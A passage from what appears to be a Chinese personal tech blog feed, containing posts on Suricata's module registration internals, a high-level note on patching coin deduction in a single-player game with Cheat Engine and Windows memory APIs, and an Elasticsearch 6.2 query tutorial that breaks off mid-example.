tmm_modules[TMM_FLOWWORKER].Func = FlowWorker;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].ThreadDeinit = FlowWorkerThreadDeinit;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].ThreadExitPrintStats = FlowWorkerExitPrintStats;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].cap_flags = 0;</span><br><span class="line">    tmm_modules[TMM_FLOWWORKER].flags = TM_FLAG_STREAM_TM|TM_FLAG_DETECT_TM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注册函数仅仅是将tmm_modules中对应的索引对应的TmModule对象</p><p>TmModule本身是一个结构体，成员变量大都是函数指针，定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">typedef struct TmModule_ &#123;</span><br><span class="line">    const char *name;</span><br><span class="line"></span><br><span class="line">    /** thread handling */</span><br><span class="line">    TmEcode (*ThreadInit)(ThreadVars *, const void *, void **);</span><br><span class="line">    void (*ThreadExitPrintStats)(ThreadVars *, void *);</span><br><span class="line">    TmEcode (*ThreadDeinit)(ThreadVars *, void *);</span><br><span class="line"></span><br><span class="line">    /** the packet processing function */</span><br><span class="line">    TmEcode (*Func)(ThreadVars *, Packet *, void *, PacketQueue *, PacketQueue *);</span><br><span class="line"></span><br><span class="line">    TmEcode (*PktAcqLoop)(ThreadVars *, void *, void *);</span><br><span class="line"></span><br><span class="line">    /** terminates the capture loop in PktAcqLoop */</span><br><span class="line">    TmEcode (*PktAcqBreakLoop)(ThreadVars *, void *);</span><br><span class="line"></span><br><span class="line">    TmEcode (*Management)(ThreadVars *, void *);</span><br><span class="line"></span><br><span class="line">    /** global Init/DeInit */</span><br><span class="line">    TmEcode (*Init)(void);</span><br><span class="line">    TmEcode (*DeInit)(void);</span><br><span class="line"></span><br><span class="line">    void (*RegisterTests)(void);</span><br><span class="line"></span><br><span class="line">    uint8_t cap_flags;   /**&lt; Flags to indicate the capability requierment of</span><br><span class="line">                             the given TmModule */</span><br><span class="line">    /* Other flags used by the module */</span><br><span class="line">    uint8_t flags;</span><br><span class="line">&#125; TmModule;</span><br></pre></td></tr></table></figure></p><h3 id="0x02-模块初始化"><a href="#0x02-模块初始化" class="headerlink" title="0x02 模块初始化"></a>0x02 模块初始化</h3><p>初始化主要分两个部分，一个是调用TmModule中的Init函数进行初始化，这部分只要有注册过的模块都会进行调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void TmModuleRunInit(void)</span><br><span class="line">&#123;</span><br><span class="line">    TmModule *t;</span><br><span class="line">    uint16_t i;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; TMM_SIZE; i++) &#123;</span><br><span class="line">        t = &amp;tmm_modules[i];</span><br><span class="line"></span><br><span class="line">        if (t-&gt;name == NULL)</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        if (t-&gt;Init == NULL)</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        t-&gt;Init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还有一部分初始化功能是调用ThreadInit，这个只有和运行模式进行关联的模块才会调用。</p><h3 id="0x03-模块关联运行模式"><a href="#0x03-模块关联运行模式" class="headerlink" title="0x03 模块关联运行模式"></a>0x03 模块关联运行模式</h3><p>主要代码都在src/util-runmodes.c中，涉及到不同运行模式，使用的模块似乎是不一样的，这里仅仅以其中一个来举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/* create the threads */</span><br><span class="line">for (int thread = 0; thread &lt; threads_count; thread++) &#123;</span><br><span class="line">    .........</span><br><span class="line">    tm_module = TmModuleGetByName(recv_mod_name);</span><br><span class="line">    if (tm_module == NULL) &#123;</span><br><span class="line">        SCLogError(SC_ERR_INVALID_VALUE, &quot;TmModuleGetByName failed for %s&quot;, recv_mod_name);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    TmSlotSetFuncAppend(tv, tm_module, aconf);</span><br><span class="line"></span><br><span class="line">    tm_module = TmModuleGetByName(decode_mod_name);</span><br><span class="line">    if (tm_module == NULL) &#123;</span><br><span class="line">        SCLogError(SC_ERR_INVALID_VALUE, &quot;TmModuleGetByName %s failed&quot;, decode_mod_name);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    TmSlotSetFuncAppend(tv, tm_module, NULL);</span><br><span class="line"></span><br><span class="line">    tm_module = TmModuleGetByName(&quot;FlowWorker&quot;);</span><br><span class="line">    if (tm_module == NULL) &#123;</span><br><span class="line">        SCLogError(SC_ERR_RUNMODE, &quot;TmModuleGetByName for FlowWorker failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    TmSlotSetFuncAppend(tv, tm_module, NULL);</span><br><span class="line"></span><br><span class="line">    tm_module = TmModuleGetByName(&quot;RespondReject&quot;);</span><br><span class="line">    if (tm_module == NULL) &#123;</span><br><span class="line">        SCLogError(SC_ERR_RUNMODE, &quot;TmModuleGetByName RespondReject failed&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    TmSlotSetFuncAppend(tv, tm_module, NULL);</span><br><span class="line">........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里省去大部分无关代码，关联运行模式的函数为TmSlotSetFuncAppend，本身的实现这里就不展开了，简单来说，就是将tm module存入thread的slots中，在后续模块触发的时候进行操作。需要注意的是，suricata的数据包捕获模块也是在这里注册的，就是在这个循环中，第一个被关联上的模块，就是用于数据捕获的模块，在启动之后，会循环调用PktAcqLoop来进行数据包的捕获。</p><h3 id="0x04-模块运行"><a href="#0x04-模块运行" class="headerlink" title="0x04 模块运行"></a>0x04 模块运行</h3><p>这部分的代码就不详细展开了，具体的情况其实和抓包模块的实现有关系，之前简单的对其中一个抓包模块进行了调研，发现它就是在PktAcqLoop中捕获到数据包之后，又对slots中保存的所有模块进行了遍历并调用Func函数，这里找了几个实现了PktAcqLoop接口的模块，发现他们都在里面获取数据包之后，调用了TmThreadsSlotProcessPkt函数。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>总的来讲我觉着suricata的代码，比snort清晰很多，至少没有之前那种看得一头雾水的情况了（主要是菜），各个模块的注册关联运行之类的都挺清楚的，其他部分也看了看，目前感觉还都挺清晰的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;诶好久没记点儿东西了，这段时间整的杂活也比较多，最近看了一些suricata的部分，这里简单的记一下，suricata的模块是如何注册，生效以及运行的。&lt;/p&gt;
&lt;p&gt;整个模块化的情况可以用一张图概括，出处 &lt;a href=&quot;https://blog.csdn.net/shenwansangz/article/details/37900875&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/shenwansangz/article/details/37900875&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdn.net/20140717093204890?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2hlbndhbnNhbmd6/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;简单来说，就是在一个线程中保存了一个slot链表，每一个slot结构体中，保存了一个模块，在后续运行的时候，会对slot进行遍历，将里面的模块取出并运行。&lt;/p&gt;
&lt;p&gt;主要分为以下几个步骤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;模块注册&lt;/li&gt;
&lt;li&gt;模块初始化&lt;/li&gt;
&lt;li&gt;模块关联运行模式&lt;/li&gt;
&lt;li&gt;模块运行&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
    
      <category term="suricata" scheme="http://yoursite.com/tags/suricata/"/>
    
  </entry>
  
  <entry>
    <title>机甲战魔金币无消耗修改器开发笔记</title>
    <link href="http://yoursite.com/2020/04/06/%E6%9C%BA%E7%94%B2%E6%88%98%E9%AD%94%E9%87%91%E5%B8%81%E6%97%A0%E6%B6%88%E8%80%97%E4%BF%AE%E6%94%B9%E5%99%A8%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/06/%E6%9C%BA%E7%94%B2%E6%88%98%E9%AD%94%E9%87%91%E5%B8%81%E6%97%A0%E6%B6%88%E8%80%97%E4%BF%AE%E6%94%B9%E5%99%A8%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-06T13:42:38.000Z</published>
    <updated>2020-07-28T14:09:22.801Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近对windows单机游戏的修改器有一点儿兴趣，就简单看了下，写了个简单的购买道具时不消耗金币的功能练手玩。</p><p>总的来说整个流程其实挺简单的，就是定位下内存中修改金币的指令，再置为nop就行了。这里的目标是前一段时间在steam登录的游戏《机甲战魔》，还是挺酷炫的，有一种开高达的感觉。</p><a id="more"></a><h3 id="0x01-cheat-engine"><a href="#0x01-cheat-engine" class="headerlink" title="0x01 cheat engine"></a>0x01 cheat engine</h3><p>查了一下，大部分网上的教程里面，那种不用现成的修改器的，大部分都是用的这个cheat engine的工具，就简单试了一下，还是挺好使的，没啥问题，和之前用八位神器改android单机游戏差不多，就是反复在内存中搜索某个值，定位到之后再设置为自己想要的值就行了。为了达成期望的功能，这里的思路其实也比较简单：</p><ol><li>先找到金币对应的内存位置</li><li>用ce定位一下，修改这个内存地址使用到的汇编代码在什么地方</li><li>把对应指令设置为nop</li></ol><p>这个过程遇到的唯一一个问题其实是，我在第二步的时候使用了ce的“find out what writes to this address”的时候，游戏直接崩了。。搁网上搜了一下，也不是啥大问题，改改ce的调试器选项就好了。</p><p>思路有了，这里也在ce中操作了一把，实现了这个功能，接下来的就是使用代码实现了。</p><h3 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h3><p>说代码实现之前，简单介绍下使用到的几个api，</p><ul><li>VirtualProtectEx 修改内存的读写属性，因为这里需要对相关的指令进行修改，而存储指令的内存空间一般是只读的，所以这里就需要对相关地址的内存读写属性进行修改。</li><li>WriteProcessMemory 这个就是直接对内存内容进行修改的函数</li></ul><p>ce作为一个图形化工具，其实已经帮忙实现了很多功能，目前的功能只用鼠标点点就行了，但是对于代码实现来说，还有一些其他功能要做，步骤大概是这个样子：</p><ol><li>通过进程名称获取到进程pid</li><li>获取到进程的基地址</li><li>获取到修改金币的内存指令的相对偏移</li><li>对相关指令部分的内存读写属性进行修改</li><li>对相关指令的内存进行写操作，把nop指令写进去</li></ol><p>整个流程其实挺清晰的，也没啥难度。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>其实没啥好说的这个，因为确实不是啥有难度的东西。。看这个玩意，其实是为了接下来想整的一个大活有关系，诶感觉要难很多，（咕咕咕咕咕咕咕）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近对windows单机游戏的修改器有一点儿兴趣，就简单看了下，写了个简单的购买道具时不消耗金币的功能练手玩。&lt;/p&gt;
&lt;p&gt;总的来说整个流程其实挺简单的，就是定位下内存中修改金币的指令，再置为nop就行了。这里的目标是前一段时间在steam登录的游戏《机甲战魔》，还是挺酷炫的，有一种开高达的感觉。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>elasticsearch从入门到删库跑路</title>
    <link href="http://yoursite.com/2019/11/27/elasticsearch%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%88%A0%E5%BA%93%E8%B7%91%E8%B7%AF/"/>
    <id>http://yoursite.com/2019/11/27/elasticsearch%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%88%A0%E5%BA%93%E8%B7%91%E8%B7%AF/</id>
    <published>2019-11-27T13:28:56.000Z</published>
    <updated>2020-07-28T14:09:43.421Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>我觉着我干的事情一直比较杂，最近弄了一些 Elasticsearch 相关的事情，我本身并不是做服务端或者大数据那一类的，但是这里仍然因为工作上的原因使用了一些es，因此这里还是整理一下，目前常用的es相关知识，至少是我这个初学者比较容易遇到的一些操作，以及踩到的一些坑。有些信息出自官方文档，或者其他的blog，人类的本质果然是复读机。。很多blog不知道到底上哪儿复制的，有些东西感觉都不太对。，也可能是我版本的问题吧，这里我使用的版本是6.2.2，kibana同版本的嗷。</p><a id="more"></a><h3 id="0x01-Elasticsearch-介绍"><a href="#0x01-Elasticsearch-介绍" class="headerlink" title="0x01 Elasticsearch 介绍"></a>0x01 Elasticsearch 介绍</h3><p>又到了喜闻乐见的复制粘贴介绍环节</p><blockquote><p>Elasticsearch是高度可伸缩的开源全文搜索和分析引擎。它允许我们快速实时地存储、搜索、分析大数据。<br>Elasticsearch使用Lucene作为内部引擎，但是在你使用它做全文搜索时，只需要使用统一开发好的API即可，而不需要了解其背后复杂的Lucene的运行原理。它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。</p></blockquote><h3 id="0x02-常-规-操-作"><a href="#0x02-常-规-操-作" class="headerlink" title="0x02 常 规 操 作"></a>0x02 常 规 操 作</h3><h4 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h4><p>这一步我的理解其实比较像数据库的建表，需要额外注意的部分是，对嵌套字段的处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT 索引名称(自定义)</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;:&#123;</span><br><span class="line">    &quot;type(自定义，类型名称)&quot;:&#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        下面可以列出各个字段的名称和类型，也可以不列出来。没有列出来的字段会在上传的时候自动建立</span><br><span class="line">        这里需要注意的是，如果说涉及到的嵌套字段的话，最好使用 nested这种类型来指定，像下面这样</span><br><span class="line">        关于嵌套字段的相关知识一会儿在下面说</span><br><span class="line">        &quot;location&quot;:&#123;</span><br><span class="line">          &quot;type&quot;:&quot;nested&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>es相关的字段类型参考：<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.2/mapping-types.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/6.2/mapping-types.html</a></p><p>在建立字段时，必须考虑好各个字段的类型，因为这个东西一旦建表之后就不能修改了，实在要改的话，只能重新建表了。（注意：这里删除字段再重新建也不行，嗨呀在这上面吃过亏好气啊）</p><h4 id="字段查询相关的语句"><a href="#字段查询相关的语句" class="headerlink" title="字段查询相关的语句"></a>字段查询相关的语句</h4><ol><li>查询所有数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match_all&quot;:&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;from&quot;:1, 查询时的起始位置</span><br><span class="line">  &quot;size&quot;:1  查询时需要数据的大小，有默认值的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这里通过from和size其实并不能查询到整个库的所有数据，如果需要查询所有的数据，或者是from+size大于10000的数据，需要使用滚动查询，后面会提这个东西，这里具体的原因似乎和分页一类的有关系，是es本身的一种限制，没有深究了。</p><ol start="2"><li><p>查询某个字段是否为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;must_not&quot;: &#123;</span><br><span class="line">        &quot;exists&quot;: &#123;</span><br><span class="line">          &quot;field&quot;: &quot;字段名&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>查询某个字段的精确值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&quot;query&quot;:&#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">        &quot;must&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;字段名称.keyword&quot;: &quot;需要查找的精确值&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="更新-amp-删除字段"><a href="#更新-amp-删除字段" class="headerlink" title="更新&amp;删除字段"></a>更新&amp;删除字段</h4><p>比如索引中存在一个tag字段，我现在想将name为a的数据的tag字段都改成x<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/type(自定义，类型名称)/_update_by_query</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;terms&quot;:&#123;</span><br><span class="line">      &quot;name.keyword&quot;:[   这里可以填入多个字段的值，keyword的作用后面再讲</span><br><span class="line">        &quot;a&quot;</span><br><span class="line">       ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;script&quot;:&#123;</span><br><span class="line">    &quot;source&quot;:&quot;ctx._source[&apos;tag&apos;]=&apos;x&apos;;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比如现在想删除所有存在name字段的数据中的name字段本身<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">删除字段</span><br><span class="line">POST index_name(自定义，索引名称)/type(自定义，类型名称)/_update_by_query</span><br><span class="line">&#123;</span><br><span class="line">  &quot;script&quot;:&quot;ctx._source.remove(\&quot;name\&quot;)&quot;,</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;bool&quot;:&#123;</span><br><span class="line">      &quot;must&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;exists&quot;:&#123;</span><br><span class="line">            &quot;field&quot;:&quot;name&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="精确值删除"><a href="#精确值删除" class="headerlink" title="精确值删除"></a>精确值删除</h4><p>例如现在需要删除所有name为test的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_delete_by_query</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;测试删除&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h4><p>这里举两个例子，时间区间查询，以及ip段区间查询<br>时间查询的话，需要给时间指定格式，或者本身在建立索引的时候，指定上格式一类的信息，<br>这里是查询time字段范围在2019-11-10 10:00:00至2019-11-20 10:00:00之间的语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">      &quot;time.keyword&quot;: &#123;</span><br><span class="line">        &quot;gte&quot;:&quot;2019-11-10 10:00:00&quot;,  gte为大于等于 gt为大于  </span><br><span class="line">        &quot;lte&quot;:&quot;2019-11-20 10:00:00&quot;,   lte为小于或等于 lt为小于</span><br><span class="line">        &quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ip段查询，查询192.168.1.0至192.168.1.255这个ip段的数据，这里ip字段本身最好也是ip类型的，但是实际操作的时候发现它可以是字符串类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST index_name(自定义，索引名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;range&quot;:&#123;</span><br><span class="line">      &quot;ip&quot;:&#123;</span><br><span class="line">        &quot;gte&quot;:&quot;192.168.1.0&quot;,</span><br><span class="line">        &quot;lte&quot;:&quot;192.168.1.255&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h4><p>聚合查询可以用来统计某个字段的数量等等一类的情况，<br>例如，统计所有年龄出现的次数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET index_name(自定义，索引名称)/type(自定义，类型名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;:0,    这里其实还是会进行一次所有数据量的查询，并展示结果，为了方便看后面聚合的数据的结果，所以这里给设置成了0</span><br><span class="line">  如果需要加上其他限制条件，例如name为test的age数据聚合计算，可以在聚合前先进行query查询相关字段的数据</span><br><span class="line">  &quot;aggs&quot;:&#123;</span><br><span class="line">    &quot;test(这里可以自定义一个名称)&quot;:&#123;</span><br><span class="line">      &quot;terms&quot;:&#123;</span><br><span class="line">        &quot;field&quot;:&quot;age&quot;,</span><br><span class="line">        &quot;size&quot;:10  这里指定显示聚合结果的条目数量</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>或者计算所有不同的age字段的数量，举例来说，比如数据库中age字段的值只有10,20,30三种，那这里算出来的结果就是3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET index_name(自定义，索引名称)/type(自定义，类型名称)/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;:0,</span><br><span class="line">  &quot;aggs&quot;:&#123;</span><br><span class="line">    &quot;test(这里可以自定义一个名称)&quot;:&#123;</span><br><span class="line">      &quot;cardinality&quot;:&#123;</span><br><span class="line">        &quot;field&quot;:&quot;age&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x03-一些遇到的坑"><a href="#0x03-一些遇到的坑" class="headerlink" title="0x03 一些遇到的坑"></a>0x03 一些遇到的坑</h3><h4 id="嵌套类型"><a href="#嵌套类型" class="headerlink" title="嵌套类型"></a>嵌套类型</h4><p>例如数据中有类似这样的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;: &quot;Nest eggs&quot;,</span><br><span class="line">  &quot;body&quot;:  &quot;Making your money work...&quot;,</span><br><span class="line">  &quot;tags&quot;:  [ &quot;cash&quot;, &quot;shares&quot; ],</span><br><span class="line">  &quot;comments&quot;: [</span><br><span class="line">    